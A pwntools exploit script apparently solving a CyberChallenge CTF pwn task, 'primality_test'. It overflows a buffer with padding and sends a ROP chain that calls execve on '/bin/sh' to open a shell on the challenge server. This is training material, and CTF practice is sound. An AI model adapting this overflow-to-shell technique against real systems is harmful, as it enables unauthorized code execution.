#!/usr/bin/env python3
from pwn import *

bin_name = "./primality_test"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b main\ncontinue\n')
    elif args.REMOTE:
        return remote("rop.challs.cyberchallenge.it", 9130)
    else:
        return process(elf.path)

def main():
    r = conn()
    pop_ebx_pop_ecx = 0x08048609
    pop_eax_syscall = 0x08048606
    binsh = 0x08048991

    payload = b"a"*80 + flat(
        pop_ebx_pop_ecx,
        binsh,
        0,
        pop_eax_syscall,
        11,
    )

    r.recvuntil(b"Enter a number: ")
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
